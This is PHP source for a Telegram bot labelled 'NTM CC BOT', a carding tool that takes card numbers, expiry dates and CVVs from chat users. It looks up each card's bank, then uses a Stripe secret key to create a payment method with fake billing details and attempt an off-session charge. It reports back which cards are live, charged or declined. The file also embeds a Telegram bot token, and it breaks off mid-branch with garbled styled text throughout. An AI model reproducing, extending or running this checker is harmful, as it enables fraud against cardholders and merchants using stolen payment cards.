<?php

////////////////=============[NTM CC BOT]=============////////////////
$botToken = "5486232252:AAH7Jr0xH7gJpD5Obgavh-8EY8AgfBAHXdk"; // Enter ur bot token
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$lastname = $update["message"]["from"]["last_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];
$premiums = file_get_contents('users.txt');
$premium = explode("\n", $premiums);
$group = file_get_contents('groups.txt');
$groups = explode("\n", $group);
if($userId == '803003146') {
$usernam = ''.$username.' γ πΏππ γ';
}
elseif($userId == '1438079488') {
        $usernam = ''.$username. ' γ πΎπ€-ππ¬π£ππ§ γ';
}
else {
$usernam = $username. 'γ ππππ γ';
}
$sk=sk-key;
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
function random_strings($length_of_string) 
{
    $str_result = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; 
    return substr(str_shuffle($str_result),  
                       0, $length_of_string); 
}
$mail = 'γπ½ππΌγmittal'.random_strings(6).'';
//////////=========[Start Command]=========//////////


if ((strpos($message, "/info") === 0)||(strpos($message, "!run") === 0)||(strpos($message, "!id") === 0)||(strpos($message, "!info") === 0)||(strpos($message, "/id") === 0)||(strpos($message, "/me") === 0)||(strpos($message, "/start") === 0)){
        sendMessage($chatId, "<b>%0Aββββββββββββββββββββ%0Aββ£πππ₯ππ π«ππ¦ ππ β£</b> <code>$userId</code>%0A<b>ββββββββββββββββββββ%0Aββ£ππ«π¨π?π© ππ β£ </b><code>$chatId</code>%0A<b>ββββββββββββββββββββ%0Aββ£ ππ¬ππ«π§ππ¦π β£</b> @$username%0A<b>ββββββββββββββββββββ%0Aββ£ππ¨ ππ§π¨π° ππ¨π¦π¦ππ§ππ¬ β£ /cmds%0Aββββββββββββββββββββ</b>", $message_id);
        }
        elseif ((strpos($message, "/chk") === 0)||(strpos($message, "!chk") === 0)||(strpos($message, "!ch") === 0)||(strpos($message, "/ch") === 0)||(strpos($message, ".ch") === 0)||(strpos($message, "!usd") === 0)||(strpos($message, "/usd") === 0)||(strpos($message, ".usd") === 0)||(strpos($message, ".chk") === 0)){
        $message = substr($message, 4);
        $amt = multiexplode(array("/", ":", " ", "|"), $message)[0];
        $cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
        $mes = multiexplode(array(":", "/", " ", "|"), $message)[2];
        $ano = multiexplode(array(":", "/", " ", "|"), $message)[3];
        $cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
        if (empty($amt)) {
        $amt = '1';
        }
                $amount = $amt * 100;
                $lista = ''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'';
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
                curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'Host: lookup.binlist.net',
                'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, '');
                $fim = curl_exec($ch);
                $bank = GetStr($fim, '"bank":{"name":"', '"');
                $name = GetStr($fim, '"name":"', '"');
                $brand = GetStr($fim, '"brand":"', '"');
                $country = GetStr($fim, '"country":{"name":"', '"');
                $emoji = GetStr($fim, '"emoji":"', '"');
                $scheme = GetStr($fim, '"scheme":"', '"');
                $info = curl_getinfo($ch);
                $time = $info['total_time'];
                $httpCode = $info['http_code'];
                 $time = substr($time, 0, 4);
                $type = GetStr($fim, '"type":"', '"');
                if(strpos($fim, '"type":"credit"') !== false){
                $bin = 'Credit';
                }else{
                $bin = 'Debit';
                };
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&billing_details[address][line1]=36&billing_details[address][line2]=Regent Street&billing_details[address][city]=Jamestown&billing_details[address][postal_code]=14701&billing_details[address][state]=New York&billing_details[address][country]=US&billing_details[email]='.$mail.'@gmail.com&billing_details[name]=γπ½ππΌγ@NTMchat Mittal');
                $result1 = curl_exec($ch);
                $tok1 = Getstr($result1,'"id": "','"');
                $msg1 = Getstr($result1,'"message": "','"');
                $ch = curl_init();
                $info = curl_getinfo($ch);
                $time = $info['total_time'];
                $httpCode = $info['http_code'];
                 $time = substr($time, 0, 4);
                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$amount.'&currency=usd&payment_method_types[]=card&description=γπ½ππΌγ@NTMchat Donation&payment_method='.$tok1.'&confirm=true&off_session=true');
                $result2 = curl_exec($ch);
                $info = curl_getinfo($ch);
                $time = $info['total_time'];
                $httpCode = $info['http_code'];
                 $time = substr($time, 0, 4);
                $msg2 = Getstr($result2,'"message": "','"');
                $rcp = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));
                if(strpos($result2, '"seller_message": "Payment complete."' )) {
                sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aββ£ πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£ γ β CVV MATCHED β β γ</b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  Successfully Charged $$amt β</b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand %0A<b>ββ£ πΎππ§π β£ </b> $scheme%0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge $$amt </b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0Aββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);
        
                }
                elseif(strpos($result2, "insufficient_funds" )) {
                sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aββ£ πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£  γ β CVV MATCHED β β γ</b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  Insufficient Funds</b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge $$amt </b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand%0A<b>ββ£ πΎππ§π β£ </b> $scheme %0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0Aββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);}
                elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){ sendMessage($chatId, "<b>πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£  γ β CVV MATCHED β β γ</b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  3D πΎππ§π</b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge $$amt </b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand%0A<b>ββ£ πΎππ§π β£ </b> $scheme %0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0Aββββββββββββββββββββ%0Aββ£ ππππ πππππ β£ <b>'.$time.'s</b>%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);}
                elseif(strpos($result2,'"cvc_check": "pass"')){
                sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aββ£ πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£  γ β CVV MATCHED β β γ</b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  Payment Cannot Be Completed</b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge $$amt </b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand%0A<b>ββ£ πΎππ§π β£ </b> $scheme %0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0Aββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);}
                elseif(strpos($result2,'"code": "incorrect_cvc"')){
                sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aββ£ πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£  γ β CCN LIVE β β γ</b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  CVV MISSMATCH</b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge $$amt</b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand%0A<b>ββ£ πΎππ§π β£ </b> $scheme %0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0Aββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);}
                elseif(strpos($result1,'"code": "incorrect_cvc"')){
                sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aββ£ πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£  γ β CCN LIVE β β </b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  CVV MISSMATCH</b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge $$amt </b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand%0A<b>ββ£ πΎππ§π β£ </b> $scheme %0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0Aββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);}
                elseif ((strpos($result1, "transaction_not_allowed")) || (strpos($result2, "transaction_not_allowed"))){
                sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aββ£ πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£  γ β CVV MATCHED β β γ</b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  Transaction Not Allowed</b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge $$amt</b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand%0A<b>ββ£ πΎππ§π β£ </b> $scheme %0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0Aββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);}
                elseif ((strpos($result1, "fraudulent")) || (strpos($result2, "fraudulent"))){
                sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aββ£ πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£  Fraudulent</b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  Declined β</b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge $$amt </b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand%0A<b>ββ£ πΎππ§π β£ </b> $scheme %0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0Aββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);}
                elseif ((strpos($result1, "expired_card")) || (strpos($result2, "expired_card"))){
                sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aββ£ πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£  Expired πΎππ§π</b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  Declined β</b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge $$amt </b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand%0A<b>ββ£ πΎππ§π β£ </b> $scheme %0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0Aββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);}
                elseif ((strpos($result1, "generic_declined")) || (strpos($result2, "generic_declined"))){
                sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aββ£ πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£  Generic Declined</b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  Declined β</b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge $$amt </b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand%0A<b>ββ£ πΎππ§π β£ </b> $scheme %0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0Aββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);
                }
                elseif ((strpos($result1, "do_not_honor")) || (strpos($result2, "do_not_honor"))){
                sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aββ£ πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£  Do Not Honor</b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  Declined β</b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge $$amt </b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand%0A<b>ββ£ πΎππ§π β£ </b> $scheme %0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0Aββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);}
                elseif ((strpos($result1, 'rate_limit')) || (strpos($result2, 'rate_limit'))){
                sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aββ£ πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£  SK IS AT RATE LIMIT</b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  Declined β</b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge $$amt </b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand%0A<b>ββ£ πΎππ§π β£ </b> $scheme %0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0Aββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);}
                
                elseif ((strpos($result1, "Your card was declined.")) || (strpos($result2, "Your card was declined."))){
                sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aββ£ πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£  Generic Declined</b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  Declined β</b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge $$amt </b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand%0A<b>ββ£ πΎππ§π β£ </b> $scheme %0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0Aββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);}
                elseif ((strpos($result1, ' "message": "Your card number is incorrect."')) || (strpos($result2, ' "message": "Your card number is incorrect."'))){
                sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aββ£ πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£  πΎππ§π Number Is Incorrect</b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  Declined β</b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge $$amt </b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand%0A<b>ββ£ πΎππ§π β£ </b> $scheme %0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0Aββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);}
                else {
                sendMessage($chatId, "<b><u><i>Unknown Error. $msg1 - $msg2</i></u></b>", $message_id);
                };
                }
                
                elseif ((strpos($message, "/inr") === 0)||(strpos($message, "!inr") === 0)||(strpos($message, ".inr") === 0)){
        $message = substr($message, 4);
        $amt = multiexplode(array("/", ":", " ", "|"), $message)[0];
        $cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
        $mes = multiexplode(array(":", "/", " ", "|"), $message)[2];
        $ano = multiexplode(array(":", "/", " ", "|"), $message)[3];
        $cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
        if (empty($amt)) {
        $amt = '100';
        }
                $amount = $amt * 100;
                $lista = ''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'';
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
                curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'Host: lookup.binlist.net',
                'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, '');
                $fim = curl_exec($ch);
                $bank = GetStr($fim, '"bank":{"name":"', '"');
                $name = GetStr($fim, '"name":"', '"');
                $brand = GetStr($fim, '"brand":"', '"');
                $country = GetStr($fim, '"country":{"name":"', '"');
                $emoji = GetStr($fim, '"emoji":"', '"');
                $scheme = GetStr($fim, '"scheme":"', '"');
                $info = curl_getinfo($ch);
                $time = $info['total_time'];
                $httpCode = $info['http_code'];
                 $time = substr($time, 0, 4);
                $type = GetStr($fim, '"type":"', '"');
                if(strpos($fim, '"type":"credit"') !== false){
                $bin = 'Credit';
                }else{
                $bin = 'Debit';
                };
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&billing_details[address][line1]=36&billing_details[address][line2]=Regent Street&billing_details[address][city]=Jamestown&billing_details[address][postal_code]=14701&billing_details[address][state]=New York&billing_details[address][country]=US&billing_details[email]='.$mail.'@gmail.com&billing_details[name]=γπ½ππΌγ@NTMchat Mittal');
                $result1 = curl_exec($ch);
                $info = curl_getinfo($ch);
                $time = $info['total_time'];
                $httpCode = $info['http_code'];
                 $time = substr($time, 0, 4);
                $tok1 = Getstr($result1,'"id": "','"');
                $msg1 = Getstr($result1,'"message": "','"');
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$amount.'&currency=inr&payment_method_types[]=card&description=γπ½ππΌγ@NTMchat Donation&payment_method='.$tok1.'&confirm=true&off_session=true');
                $result2 = curl_exec($ch);
                $info = curl_getinfo($ch);
                $time = $info['total_time'];
                $httpCode = $info['http_code'];
                 $time = substr($time, 0, 4);
                $msg2 = Getstr($result2,'"message": "','"');
                $rcp = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));
                if(strpos($result2, '"seller_message": "Payment complete."' )) {
                sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aββ£ πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£  γ β CVV MATCHED β β γ</b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  Successfully Charged βΉ$amt β</b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand %0A<b>ββ£ πΎππ§π β£ </b> $scheme%0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge βΉ$amt </b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0Aββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);
                }
                elseif(strpos($result2, "insufficient_funds" )) {
                sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aββ£ πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£  γ β CVV MATCHED β β γ</b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  Insufficient Funds</b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge βΉ$amt </b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand %0A<b>ββ£ πΎππ§π β£ </b> $scheme%0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0Aββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);}
                elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){ sendMessage($chatId, "<b>πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£  γ β CVV MATCHED β β γ</b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  3D πΎππ§π</b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge βΉ$amt </b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand %0A<b>ββ£ πΎππ§π β£ </b> $scheme%0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0Aββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);}
